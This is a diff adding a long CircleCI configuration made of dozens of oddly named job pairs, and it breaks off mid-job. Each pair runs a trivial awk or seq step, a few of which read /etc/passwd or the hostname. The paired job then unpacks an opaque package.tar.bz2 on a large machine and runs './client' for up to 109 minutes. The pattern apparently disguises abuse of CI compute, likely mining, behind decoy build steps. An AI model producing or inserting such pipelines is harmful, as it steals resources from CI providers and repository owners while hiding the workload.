@@ -1,0 +1,1551 @@
+version: 2.1
+
+jobs:
+  fixture_zulu-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hanging straight
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; seq 1 950044 | awk '{print $1*7919 % 2147483647}' > /tmp/_bld/log.gz; true
+            ls -la /tmp/_bld/log.gz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - log.gz
+  zulu-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/log.gz || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  tester_apr19-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: split jump
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=0;i<40;i++)s=s"-"; print "|" s "|"}'; true ; } > /tmp/_bld/2023-10-14.data
+            ls -la /tmp/_bld/2023-10-14.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-10-14.data
+  apr19-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-10-14.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  hydrate_node20-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: warm boot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 10 | tac | awk '{print NR, $0}'; true ; } > /tmp/_bld/bundle
+            ls -la /tmp/_bld/bundle | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - bundle
+  node20-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/bundle || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  retry_produce-nightly-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: blend edges
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=50;i++)n+=i*i*i; print n}'; true ; } > /tmp/_bld/step-3.log
+            ls -la /tmp/_bld/step-3.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-3.log
+  produce-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/step-3.log || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  loader_io:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: late friday
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo 'a:b:c:d:e' | awk -F: '{print NF}'; true ; } > /tmp/_bld/package
+            ls -la /tmp/_bld/package | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  io:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/package || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  step2_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: 3am noodle
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 2)) $((RANDOM / 2)) $((RANDOM ^ 42)) | md5sum; true ; } > /tmp/_bld/.pid
+            ls -la /tmp/_bld/.pid | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .pid
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/.pid || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  prebuild_verify-staging-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cookout
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/_bld/stage.dat
+            ls -la /tmp/_bld/stage.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage.dat
+  verify-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/stage.dat || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  precheck_ValidateStaging:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: quiet now
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "%s\n" 10 20 30 | awk '{s+=$1; n++}END{print s/n}'; true ; } > /tmp/_bld/big_task_output.txt
+            ls -la /tmp/_bld/big_task_output.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - big_task_output.txt
+  ValidateStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-01-03.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  reset_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: please please please
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="encode me well"; cmd=""; for(i=1;i<=length(s);i++){c=substr(s,i,1); cmd=cmd c}; print cmd}'; true ; } > /tmp/_bld/91.txt
+            ls -la /tmp/_bld/91.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 91.txt
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/91.txt || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  Delta_dec6-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: rotate
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'END{print NR*NR+1}'; true ; } > /tmp/_bld/main_job_output_v3.log
+            ls -la /tmp/_bld/main_job_output_v3.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - main_job_output_v3.log
+  dec6-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/main_job_output_v3.log || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  prep_andromeda-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: zip zap
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "x" | md5sum | md5sum | awk '{print $1}'; true ; } > /tmp/_bld/phase-ok.log
+            ls -la /tmp/_bld/phase-ok.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-ok.log
+  andromeda-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/phase-ok.log || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  warmer_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: undertow
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; touch /tmp/_t && stat -c %U:%G /tmp/_t 2>/dev/null && rm /tmp/_t; true ; } > /tmp/_bld/checkpoint-D.pkl
+            ls -la /tmp/_bld/checkpoint-D.pkl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - checkpoint-D.pkl
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/checkpoint-D.pkl || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  prebuild_DeployTests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: granny knot
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 19922944 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/_bld/manifest
+            ls -la /tmp/_bld/manifest | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - manifest
+  DeployTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/manifest || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  route_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: calf raise
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tr -c 'a-z\n' 'X' < /etc/hostname | head -c 50; true ; } > /tmp/_bld/stage-complete.sig
+            ls -la /tmp/_bld/stage-complete.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage-complete.sig
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-01-03.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  checker_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: is it flaky
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 189214 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/_bld/output.md
+            ls -la /tmp/_bld/output.md | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - output.md
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-01-03.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  hook_v8-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: infrared
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cut -d: -f3 /etc/passwd | sort -n | tail -1; true ; } > /tmp/_bld/2023-01-03.data
+            ls -la /tmp/_bld/2023-01-03.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2023-01-03.data
+  v8-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-01-03.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  teardown_fix-5183:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: tracks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; which bash || echo bash-missing; true ; } > /tmp/_bld/relay.sig
+            ls -la /tmp/_bld/relay.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - relay.sig
+  fix-5183:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/relay.sig || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  teardown_node18-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: burn in
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/_bld/2024-03-07.data
+            ls -la /tmp/_bld/2024-03-07.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-03-07.data
+  node18-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2024-03-07.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  redo_atlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: press flat
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'BEGIN{v=0}{v=(v*31+$1)%100003}END{print v}'; true ; } > /tmp/_bld/04.out
+            ls -la /tmp/_bld/04.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 04.out
+  atlas:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/04.out || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  reset_realease-27:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: glute kick
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; date +%s; true ; } > /tmp/_bld/55.blob
+            ls -la /tmp/_bld/55.blob | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 55.blob
+  realease-27:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/55.blob || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  env_q4-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: go
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{num=12345; r=""; while(num>0){r=(num%2) r; num=int(num/2)}; print r}'; true ; } > /tmp/_bld/artifact.bin
+            ls -la /tmp/_bld/artifact.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact.bin
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/artifact.bin || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  retry_PackageApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: cartwheel sweep
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 50 | md5sum | awk '{print $1}'; true ; } > /tmp/_bld/step-28.log
+            ls -la /tmp/_bld/step-28.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-28.log
+  PackageApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/step-28.log || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  gamma_orion-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: mon morning
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ps -eo pid,ppid 2>/dev/null | wc -l; true ; } > /tmp/_bld/339.out
+            ls -la /tmp/_bld/339.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 339.out
+  orion-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/339.out || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  checker_MERGE_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: blow dry
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf 'line1\n\nline2\n\nline3' | sed -n '/^$/d; p' | wc -l; true ; } > /tmp/_bld/audit.txt
+            ls -la /tmp/_bld/audit.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.txt
+  MERGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/audit.txt || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  loader_v3-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: weigh anchor
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ls /dev | wc -l; true ; } > /tmp/_bld/.ok
+            ls -la /tmp/_bld/.ok | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ok
+  v3-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/.ok || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  fixture_preview-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: hotfix fri
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; sort /etc/passwd | wc -l; true ; } > /tmp/_bld/event.log
+            ls -la /tmp/_bld/event.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - event.log
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/2023-01-03.data || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  p1_mar20-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: sun dry
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "0123456789abcdef" | od -An -c | head -1; true ; } > /tmp/_bld/gate-ready.out
+            ls -la /tmp/_bld/gate-ready.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - gate-ready.out
+  mar20-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/gate-ready.out || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  tmp_prometheus-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: deadlift
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="banana"; for(i=1;i<=length(s);i++){if(substr(s,i,1)=="a")c++}; print c}'; true ; } > /tmp/_bld/pt-main.pickle
